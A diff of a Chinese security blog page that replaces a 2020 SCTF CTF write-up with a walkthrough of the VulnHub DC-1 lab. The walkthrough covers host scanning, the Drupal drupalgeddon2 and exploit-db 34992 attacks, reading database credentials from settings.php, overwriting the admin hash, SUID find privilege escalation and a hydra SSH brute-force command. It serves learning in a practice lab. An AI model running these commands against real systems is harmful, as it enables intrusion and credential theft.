@@ -4,7 +4,7 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="2020SCTF, 1cePeak">
+    <meta name="keywords" content="Vulhub靶机：DC-1, 1cePeak">
     <meta name="description" content="一头CTF签到爱好者">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>2020SCTF | 1cePeak</title>
+    <title>Vulhub靶机：DC-1 | 1cePeak</title>
     <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/1ceP3ak/1ceP3ak.github.io/panda.png">
 
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/1ceP3ak/1ceP3ak.github.io/libs/awesome/css/all.css">
@@ -259,12 +259,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/images/SCTF.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/images/Drupal.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">2020SCTF</h1>
+                    <h1 class="description center-align post-title">Vulhub靶机：DC-1</h1>
                 </div>
             </div>
         </div>
@@ -381,8 +381,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
+                            <a href="/tags/靶场/">
+                                <span class="chip bg-color">靶场</span>
+                            </a>
+                        
+                            <a href="/tags/渗透测试/">
+                                <span class="chip bg-color">渗透测试</span>
                             </a>
                         
                     </div>
@@ -397,7 +401,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-07-08
+                    2021-01-06
                 </div>
                 
 
@@ -413,92 +417,114 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="XCTF联赛分站赛-SCTF题解"><a href="#XCTF联赛分站赛-SCTF题解" class="headerlink" title="XCTF联赛分站赛-SCTF题解"></a>XCTF联赛分站赛-SCTF题解</h1><p>每次比赛都是本考研🐕为数不多的放松时间，真的开心<br>高考加油~<br><img src="//1cepeak.cn/2020/07/08/2020sctf/2020SCTF_Result.png" alt><br>由于Nepnep很多师傅去实习了，所以本次参赛的师傅比较少~</p>
-<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="sign-in"><a href="#sign-in" class="headerlink" title="sign-in"></a>sign-in</h3><p>铁签到了，tg入群即可拿flag</p>
-<h3 id="Dou-dizhu"><a href="#Dou-dizhu" class="headerlink" title="Dou dizhu"></a>Dou dizhu</h3><p>斗地主，永远滴神，我xxx就不信你17张牌能秒了我！<br>地主赢了出flag，可能有卢老爷名字的加成，一手春天直接带走双开页面IDIOT的大哥~<br><img src="//1cepeak.cn/2020/07/08/2020sctf/doudizhu.png" alt><br>体验很好下次还来</p>
-<h3 id="EasyMisc"><a href="#EasyMisc" class="headerlink" title="EasyMisc"></a>EasyMisc</h3><p>拿到一张打不开的图片，放进winhex分析<br><img src="//1cepeak.cn/2020/07/08/2020sctf/easymisc_hex.png" alt><br>看到图片名字和前两个字节就可以猜出是hex反序，脚本如下：</p>
-<pre class=" language-python"><code class="language-python">a <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'galf_si_erehw.jpg'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
-f <span class="token operator">=</span> a<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
-b <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'flag.jpg'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>f<span class="token punctuation">)</span></code></pre>
-<p>之后删除中间的02垃圾数据，补全图片头部即可打开图片<br><img src="//1cepeak.cn/2020/07/08/2020sctf/easymisc_flag.png" alt><br>成功打开之后得到一个flag字符串<br><img src="//1cepeak.cn/2020/07/08/2020sctf/easymisc_flag.jpg" alt><br>继续使用Strings分析图片，可以看到有一串密文。</p>
+                <p>考完研没什么事，终于可以安心搞技术了。打算刷一波Vulhub的靶场，文中如有欠妥的地方还希望各位师傅指正。</p>
+<p>#Vulhub DC-1</p>
+<p>靶机DC-1下载地址：<a href="https://download.vulnhub.com/dc/DC-1.zip" target="_blank" rel="noopener">https://download.vulnhub.com/dc/DC-1.zip</a></p>
+<p>靶机描述：靶机DC-1共有5个flag，并且需要root权限才可以找到并查看flag。</p>
+<p>靶机IP：192.168.1.146<br>Kali IP：192.168.1.147</p>
+<p>靶机与kali以NAT模式连接网络<br>运行部署好的虚拟机，开机提示需要账号密码，但是没有提供密码，需要自己去渗透提权</p>
+<p>##一、信息收集</p>
+<p>由于不知道靶机的IP，这就需要探测同一区域中存活的主机</p>
+<p>###1.探测目标</p>
+<p>####方法一 arp-scan<br><a href="https://blog.csdn.net/weixin_43221560/article/details/90550294" target="_blank" rel="noopener">arp-scan使用方法</a></p>
 <blockquote>
-<p>Maybe You are close to flag but U can’t find me~<br>Maybe You are close to me  xoBTuw36SfH4hicvCzFD9ESj<br>rc4,gb2312 </p>
+<p>sudo arp-scan -l<br>-l 使用网络接口</p>
 </blockquote>
-<p><img src="//1cepeak.cn/2020/07/08/2020sctf/easymisc_flagtext.png" alt><br><img src="//1cepeak.cn/2020/07/08/2020sctf/easymisc_text.png" alt><br>根据提示使用CyberChef解密字符串<br><img src="//1cepeak.cn/2020/07/08/2020sctf/easymisc_result.png" alt></p>
-<h3 id="Can-you-hear"><a href="#Can-you-hear" class="headerlink" title="Can you hear"></a>Can you hear</h3><blockquote>
-<p>我们用接收机收到了来自空间站传来的信息, 尝试解开答案😀.</p>
-</blockquote>
-<p>题目读到一半果断打开RX-SSTV识别wav音频（手机端使用Robot36），错失一血，拿到了三血（淦<br>奈何第一遍身边有杂音，第二遍识别结果就很清晰了orz<br><img src="//1cepeak.cn/2020/07/08/2020sctf/iss.png" alt></p>
-<h3 id="AndroidDisplayBridge"><a href="#AndroidDisplayBridge" class="headerlink" title="AndroidDisplayBridge"></a>AndroidDisplayBridge</h3><blockquote>
-<p>大猫师傅yyds</p>
-</blockquote>
-<p>安卓一加6手机流量分析（国货之光<br>从流量分析中找到了软件scrcpy，出题人应该是用srcpy绘制了flag<br><img src="//1cepeak.cn/2020/07/08/2020sctf/android_sc.png" alt></p>
+<p>可以看到，同一区域段的靶机ip 192.168.1.146<br><img src="//1cepeak.cn/2021/01/06/vulhub-ba-ji-dc-1/ScanAlivePC.png" alt></p>
+<p>####方法二 netdiscover</p>
 <blockquote>
-<p>adb协议分析 <a href="https://github.com/cstyan/adbDocumentation" target="_blank" rel="noopener">https://github.com/cstyan/adbDocumentation</a></p>
+<p>netdiscover -r 192.168.1.0/24</p>
 </blockquote>
-<p>思路就是根据wireshark的流量分析，找到带WRTE的数据包，根据里面的datalen把后面的adbdata都提取出来<br>全部提取出来之后根据源码里面的提示，前12个字节是metadata，头部数据去掉之后丢到ffmpeg里面。<br>先使用wireshark导出5555来的全部tcp流，然后脚本提取出adb协议的WRTE包数据：</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> struct <span class="token keyword">import</span> unpack
-
-f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'phone_to_pc.bin'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>
-current <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
-out <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'result.bin'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>
-remote_id <span class="token operator">=</span> <span class="token number">134</span>
-
-<span class="token keyword">while</span> f<span class="token punctuation">:</span>
-    <span class="token keyword">if</span> current <span class="token operator">==</span> b<span class="token string">"WRTE"</span><span class="token punctuation">:</span>
-        arg0<span class="token punctuation">,</span> arg1<span class="token punctuation">,</span> data_len<span class="token punctuation">,</span> data_crc32 <span class="token operator">=</span> unpack<span class="token punctuation">(</span><span class="token string">"&lt;IIII"</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-        <span class="token keyword">assert</span><span class="token punctuation">(</span>unpack<span class="token punctuation">(</span><span class="token string">"!I"</span><span class="token punctuation">,</span> current<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0xffffffff</span> <span class="token operator">==</span> unpack<span class="token punctuation">(</span><span class="token string">"!I"</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># magic</span>
-        data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span>data_len<span class="token punctuation">)</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span>arg1 <span class="token operator">==</span> remote_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
-            <span class="token keyword">print</span><span class="token punctuation">(</span>data_len<span class="token punctuation">)</span>
-            out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
-        current <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
-    <span class="token keyword">else</span><span class="token punctuation">:</span>
-        current <span class="token operator">=</span> current<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-</code></pre>
-<p>因为前12个字节是metadata，所以写脚本去除</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> struct <span class="token keyword">import</span> unpack
-
-f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'result.bin'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>
-
-f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span>
-
-f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
-
-pending <span class="token operator">=</span> None
-
-a <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'flag.h264'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>
-
-<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
-    pts <span class="token operator">=</span> unpack<span class="token punctuation">(</span><span class="token string">'!q'</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
-    <span class="token keyword">assert</span><span class="token punctuation">(</span>pts <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">or</span> <span class="token punctuation">(</span>pts <span class="token operator">&amp;</span> <span class="token number">0x8000000000000000</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
-    pkt_len <span class="token operator">=</span> unpack<span class="token punctuation">(</span><span class="token string">'!i'</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
-
-    pkt_data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span>pkt_len<span class="token punctuation">)</span>
-
-    <span class="token keyword">if</span> <span class="token punctuation">(</span>pts <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        pending <span class="token operator">=</span> pkt_data
-        <span class="token keyword">continue</span>
-
-      <span class="token keyword">if</span> pending <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>
-        pkt_data <span class="token operator">=</span> pending <span class="token operator">+</span> pkt_data
-        pending <span class="token operator">=</span> None
-
-      <span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>pkt_data<span class="token punctuation">)</span><span class="token punctuation">)</span>
-     a<span class="token punctuation">.</span>write<span class="token punctuation">(</span>pkt_data<span class="token punctuation">)</span></code></pre>
-<p>之后将得到的h264数据流使用ffmpeg转化为mp4</p>
+<p>扫描ip段，得到靶机ip 192.168.1.146</p>
+<p>####方法三 nmap</p>
 <blockquote>
-<p>ffmpeg -i flag.h264 flag.mp4</p>
+<p>nmap 192.168.1.0/24</p>
 </blockquote>
-<p>打开视频就可以看到出题人绘制flag的操作了<br><img src="//1cepeak.cn/2020/07/08/2020sctf/android.png" alt></p>
-<h3 id="PassWord-Lock"><a href="#PassWord-Lock" class="headerlink" title="PassWord Lock"></a>PassWord Lock</h3><blockquote>
-<p>大猫师傅tql，就硬看</p>
+<p>###2.查看目标开放端口</p>
+<blockquote>
+<p>nmap -sV -p- 192.168.1.146<br>-sV 用来扫描目标主机和端口上运行的软件的版本<br>-p- 扫描0-65535全部端口</p>
 </blockquote>
-<p>不分析逻辑，看到在sub_80002F0里面有SCTF地方的字样重点分析，然后找到了触发SWIER这个软中断的的地址0x40010410，看到往里面写了0b10，0b100，0b100，0b1000这样的东西，也就是1，2，3，4然后居然就做出来了，</p>
-<p>这里的关键在于理解这个函数后面的部分：<br><img src="//1cepeak.cn/2020/07/08/2020sctf/password.png" alt><br>0x388的函数里面向串口寄存器写入了一个u8值，并进行了循环等待，结合ascii特征，可以认为这里在进行单字符的串口写入。</p>
-<p>下面的0x3F0函数进去之后发现什么都没做（只是执行了空循环体），可以判断为sleep（单片机由于每条指令的执行时间是确定的，sleep可以直接用循环/nop实现）。</p>
-<p>也就是说这里每隔一秒向软中断（EXTI）的启用配置寄存器（SWIER）写入了不同的值，解出来就分别是0b10，0b100，0b100，0b1000，由于这里存在不少规律，直接按顺序写出来当成flag去尝试了一下（不管怎么样，总共也就只有4!=24种映射方式），就成了。<br><img src="//1cepeak.cn/2020/07/08/2020sctf/password_flag.png" alt><br>SCTF{1442413}</p>
+<p>在这里我直接使用nmap -A 192.168.1.146<br><img src="//1cepeak.cn/2021/01/06/vulhub-ba-ji-dc-1/Nmap.png" alt><br>由上图可以看到，该目标开放了ssh服务的22端口、http的80、apache 111的rpcbind等。<br>可以直接访问80端口，查看站点信息。<br><img src="//1cepeak.cn/2021/01/06/vulhub-ba-ji-dc-1/Wappalyzer.png" alt></p>
+<blockquote>
+<p>Server：Apache/2.2.22 (Debian)<br>Vary：Accept-Encoding<br>X-Generator ：Drupal 7 (<a href="http://drupal.org" target="_blank" rel="noopener">http://drupal.org</a>)<br>X-Powered-By ：PHP/5.4.45-0+deb7u14</p>
+</blockquote>
+<p>##二、漏洞利用</p>
+<p>###1.漏洞查找<br>掏出神器msf，使用Metasploit搜索针对Drupal的模块。<br><img src="//1cepeak.cn/2021/01/06/vulhub-ba-ji-dc-1/msf.png" alt></p>
+<p>###2.漏洞利用<br>选择合适的版本，使用第四个exploit/unix/webapp/drupal_drupalgeddon2模块打，配置这个模块即可。</p>
+<blockquote>
+<p>Use exploit/unix/webapp/drupal_drupalgeddon2<br>Show options //查看需要配置项<br>set rhosts 192.168.1.146<br>设置远程主机的IP为靶机的IP地址192.168.1.146</p>
+</blockquote>
+<p>###3.Getshell<br><img src="//1cepeak.cn/2021/01/06/vulhub-ba-ji-dc-1/exploit.png" alt><br>成功弹回shell，直接使用ls查看目录，拿到flag1.txt<br><img src="//1cepeak.cn/2021/01/06/vulhub-ba-ji-dc-1/flag1.png" alt></p>
+<blockquote>
+<p>flag1<br>每一个好的CMS都需要一个配置文件，你也一样。</p>
+</blockquote>
+<p>搜索到Drupal的默认配置文件为 /var/www/sites/default/settings.php<br>直接cat配置文件，可以看到flag2及数据库的账号密码。<br><img src="//1cepeak.cn/2021/01/06/vulhub-ba-ji-dc-1/flag2.png" alt></p>
+<blockquote>
+<p>flag2<br>蛮力和字典攻击不行，唯一方法是获得访问权限(你将需要访问的)。你能用这些凭证做什么?</p>
+</blockquote>
+<p>如果我们继续使用这个普通的shell登录数据库，可以发现回显不完全，这时候就需要弹一个交互式的shell，方便我们下一步的操作。</p>
+<blockquote>
+<p>python -c ‘import pty; pty.spawn(“/bin/bash”)’</p>
+</blockquote>
+<p><img src="//1cepeak.cn/2021/01/06/vulhub-ba-ji-dc-1/pythonShell.png" alt><br>紧接着使用flag2得到的数据库账号密码登录数据库</p>
+<blockquote>
+<p>mysql -udbuser -p<br>Enter password:R0ck3t</p>
+</blockquote>
+<p>查看数据库，在drupaldb库users表中发现admin用户<br><img src="//1cepeak.cn/2021/01/06/vulhub-ba-ji-dc-1/showData.png" alt><br><img src="//1cepeak.cn/2021/01/06/vulhub-ba-ji-dc-1/users.png" alt><br><img src="//1cepeak.cn/2021/01/06/vulhub-ba-ji-dc-1/usersPass.png" alt><br>可以看到admin用户的密码被加密了，但是我们可以想办法修改密码或新增一个admin权限的用户，从而达到登录站点后台的目的。</p>
+<p>####方法一 利用自带加密脚本更新密码</p>
+<p>Drupal 7采用了新型的Hash加密方法来确保密码安全。“加了盐（Salt）”的MD5码。<br>在Drupal 7的安装目录中的scripts目录下，是Drupal 7开发者提供的PHP脚本，其中包含了MD5加密算法脚本：password-hash.sh，可以利用脚本直接生成。<br>当然也可以利用网络搜索该cms框架忘记密码的解决办法，官方有提供现成的明文和密文。</p>
+<blockquote>
+<p>./scripts/password-hash.sh 123456<br>password: 123456<br>hash: $S$DbpIRKV5QXrJK4Gbhb.LDFoTjqoYNKAOB.DY3V1BL.JMbMkZANhY</p>
+</blockquote>
+<p>更新admin密码为123456</p>
+<blockquote>
+<p>update  drupaldb.users  set pass=”$S$DbpIRKV5QXrJK4Gbhb.LDFoTjqoYNKAOB.DY3V1BL.JMbMkZANhY” where uid=1;</p>
+</blockquote>
+<p>####方法二 利用漏洞添加新用户<br>拿到users表信息，发现破解不了密码，我们可以尝试去exploitdb中看看有没有攻击admin的脚本。<br><img src="//1cepeak.cn/2021/01/06/vulhub-ba-ji-dc-1/sploitDrupal.png" alt><br>可以看到在exploitdb中有一个针对Drupal 7版本的攻击脚本，可以增加一个admin权限的用户。</p>
+<blockquote>
+<p>python /usr/share/exploitdb/exploits/php/webapps/34992.py -t <a href="http://192.168.1.146" target="_blank" rel="noopener">http://192.168.1.146</a> -u test -p test</p>
+</blockquote>
+<p><img src="//1cepeak.cn/2021/01/06/vulhub-ba-ji-dc-1/exp1.png" alt><br><img src="//1cepeak.cn/2021/01/06/vulhub-ba-ji-dc-1/exp2.png" alt><br>接下来使用添加成功的test/test用户登陆后台，在Content模块中发现flag3。<br><img src="//1cepeak.cn/2021/01/06/vulhub-ba-ji-dc-1/content.png" alt><br><img src="//1cepeak.cn/2021/01/06/vulhub-ba-ji-dc-1/flag3.png" alt></p>
+<blockquote>
+<p>flag3<br>Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</p>
+</blockquote>
+<p>由于flag3提示词有perms、find、-exec、shadow共四个特殊提示词，所以这里应该要查看shadow文件，并使用find命令提权。</p>
+<blockquote>
+<p>/etc/passwd 是一个纯文本文件。它存储用户帐户信息。它包含系统帐户的列表，为每个帐户提供一些有用的信息，如用户 ID、组 ID、主目录、shell等详情。<br>而etc/shadow是/etc/passwd的影子文件，存有密码信息。</p>
+</blockquote>
+<p>根据之前的提示，cat /etc/passwd可以发现flag4用户<br><img src alt><br>进入flag4用户的目录下，发现flag4.txt文件，并给予提示flag in root(在这里我感觉权限没有做好，应该是提权之后才可以访问flag4的目录，这样比较合理)<br><img src="//1cepeak.cn/2021/01/06/vulhub-ba-ji-dc-1/passwd.png" alt><br><img src="//1cepeak.cn/2021/01/06/vulhub-ba-ji-dc-1/flag4.png" alt></p>
+<blockquote>
+<p>flag4<br>Can you use this same method to find or access the flag in root?<br>Probably. But perhaps it’s not that easy.  Or maybe it is?</p>
+</blockquote>
+<p>flag4提示flag在root目录下，在/root下发现thefinalflag.txt，但是没有读取的权限</p>
+<p>根据flag3的提示，我们考虑find命令作为突破口。</p>
+<blockquote>
+<p>SUID提权的思路： 以普通用户身份运行root用户所拥有的SUID的文件，那么普通用户运行该文件的时候就得获得root用户的身份了。</p>
+</blockquote>
+<p>使用以下命令可以发现系统上运行的所有SUID可执行文件。</p>
+<blockquote>
+<p>find / -user root -perm -4000 -print 2&gt;/dev/null<br>find / -perm -u=s -type f 2&gt;/dev/null<br>find / -user root -perm -4000 -exec ls -ldb {} ;</p>
+</blockquote>
+<p>我们在之前拿到的shell中使用find命令查找具有root权限的SUID的文件。</p>
+<blockquote>
+<p>find / -user root -perm -4000 -print 2&gt;/dev/null</p>
+</blockquote>
+<p><img src="//1cepeak.cn/2021/01/06/vulhub-ba-ji-dc-1/suid.png" alt><br>这里使用find命令，因为它可以使用root权限，根据flag4的提示，flag in root，执行命令：find /root 可以看到有一个thefinalflag.txt，为了获得文件内容，可以利用exec后面的命令直接抓取该文件。</p>
+<blockquote>
+<p>find /root/thefinalflag.txt -exec cat {} ; </p>
+</blockquote>
+<p><img src="//1cepeak.cn/2021/01/06/vulhub-ba-ji-dc-1/flag5.png" alt><br>上图可以看到已经利用成功，拿到flag。</p>
+<blockquote>
+<p>flag5<br>Well done!!!!<br>Hopefully you’ve enjoyed this and learned some new skills.<br>You can let me know what you thought of this little journey<br>by contacting me via Twitter - @DCAU7</p>
+</blockquote>
+<p>##三、总结</p>
+<p>###1.局域网存活主机发现<br>sudo arp-scan -l <a href="https://blog.csdn.net/weixin_43221560/article/details/90550294" target="_blank" rel="noopener">arp-scan使用方法</a></p>
+<p>sudo netdiscover -i eth0 <a href="https://manpages.debian.org/unstable/netdiscover/netdiscover.8.en.html" target="_blank" rel="noopener">netdiscover使用方法</a></p>
+<p>nmap 192.168.1.0/24 <a href="https://www.cnblogs.com/h4ck0ne/p/5154683.html" target="_blank" rel="noopener">nmap使用方法</a></p>
+<p>###2.漏洞查找与利用<br>神器MSF的使用<a href="http://sh1yan.top/2019/07/28/MSF-Command-Notes/" target="_blank" rel="noopener">MSF使用方法</a></p>
+<p>###3.suid提权<br><a href="https://blog.csdn.net/qq_36119192/article/details/84872644" target="_blank" rel="noopener">suid提权1</a><br><a href="https://blog.csdn.net/qq_40510246/article/details/95939784?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase" target="_blank" rel="noopener">suid提权2</a><br><a href="https://www.cnblogs.com/huchong/p/9961625.html" target="_blank" rel="noopener">find命令exec</a></p>
+<p>###4.交互shell<br><a href="https://www.freebuf.com/news/142195.html" target="_blank" rel="noopener">交互shell使用方法</a></p>
+<p>###5.hydra爆破<br>sudo hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.1.146<br><a href="http://www.ha97.com/5186.html" target="_blank" rel="noopener">Hydra爆破使用方法</a></p>
 
             </div>
             <hr/>
@@ -524,7 +550,7 @@ a <span class="token operator">=</span> open<span class="token punctuation">(</s
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://1cepeak.cn/2020/07/08/2020sctf/">http://1cepeak.cn/2020/07/08/2020sctf/</a>
+                    <a href="http://1cepeak.cn/2021/01/06/vulhub-ba-ji-dc-1/">http://1cepeak.cn/2021/01/06/vulhub-ba-ji-dc-1/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -562,8 +588,12 @@ a <span class="token operator">=</span> open<span class="token punctuation">(</s
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
+                                <a href="/tags/靶场/">
+                                    <span class="chip bg-color">靶场</span>
+                                </a>
+                            
+                                <a href="/tags/渗透测试/">
+                                    <span class="chip bg-color">渗透测试</span>
                                 </a>
                             
                         </div>
@@ -608,7 +638,7 @@ a <span class="token operator">=</span> open<span class="token punctuation">(</s
         repo: '1cep3ak.blog',
         owner: '1ceP3ak',
         admin: ["1ceP3ak"],
-        id: '2020-07-08T08-34-50',
+        id: '2021-01-06T16-00-03',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -632,9 +662,10 @@ a <span class="token operator">=</span> open<span class="token punctuation">(</s
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/01/06/vulhub-ba-ji-dc-1/">
                     <div class="card-image">
@@ -654,9 +685,9 @@ a <span class="token operator">=</span> open<span class="token punctuation">(</s
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-01-06
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-06
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -665,6 +696,7 @@ a <span class="token operator">=</span> open<span class="token punctuation">(</s
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -687,25 +719,25 @@ a <span class="token operator">=</span> open<span class="token punctuation">(</s
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/06/01/2020rctf/">
+                <a href="/2020/07/08/2020sctf/">
                     <div class="card-image">
                         
-                        <img src="/images/RCTF.png" class="responsive-img" alt="2020RCTF">
+                        <img src="/images/SCTF.png" class="responsive-img" alt="2020SCTF">
                         
-                        <span class="card-title">2020RCTF</span>
+                        <span class="card-title">2020SCTF</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            本懒🐕终于在新博客开工了祝大家六一儿童节快乐呀~
-XCTF联赛分站赛-RCTF题解
-Misclisten拿到题目是一个MP3文件，听了几遍之后未发现异常，接着使用MP3Stego以及MP3 Private Key分析，卒。联想音符加解密，
+                            XCTF联赛分站赛-SCTF题解每次比赛都是本考研🐕为数不多的放松时间，真的开心高考加油~由于Nepnep很多师傅去实习了，所以本次参赛的师傅比较少~
+Miscsign-in铁签到了，tg入群即可拿flag
+Dou dizhu斗地主，永远
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-06-01
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-08
                             </span>
                         <span class="publish-author">
                             
